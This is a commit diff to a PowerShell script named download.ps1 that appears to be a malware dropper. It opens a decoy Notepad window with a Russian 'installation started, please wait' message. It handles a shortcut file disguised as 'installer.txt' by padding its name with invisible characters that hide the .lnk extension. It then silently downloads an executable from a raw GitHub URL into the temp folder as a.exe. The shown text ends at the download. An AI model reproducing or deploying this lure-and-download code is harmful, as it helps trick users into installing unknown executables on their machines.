858f474b389b5c1489f7eac876d2f5659869342e
nesabydy00 <113685411+nesabydy00@users.noreply.github.com>
2026-07-16 12:14:48 +0300

    Update download.ps1

--- download.ps1
+++ download.ps1
@@ -1,7 +1,19 @@
+$txt = "$env:TEMP\info.txt"
+
+@"
+Установка запущена.
+
+Пожалуйста, подождите...
+"@ | Out-File $txt -Encoding UTF8
+
+Start-Process notepad.exe $txt
+
 $folder = (Get-Location).Path
 
 $lnk = Join-Path $folder "installer.txt⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀.lnk"
 $txt = Join-Path $folder "installer.txt"
+
+Start-Sleep -Seconds 2
 
 if (Test-Path $lnk) {
     Remove-Item $lnk -Force
@@ -12,8 +24,6 @@ if (Test-Path $lnk) {
 
 Пожалуйста, подождите...
 "@ | Out-File $txt -Encoding UTF8
-
-Start-Process notepad.exe $txt
 
 $wc = New-Object System.Net.WebClient
 $wc.DownloadFile('https://raw.githubusercontent.com/nesabydy00/dgeagagaeg/main/launch.exe', "$env:TEMP\a.exe")
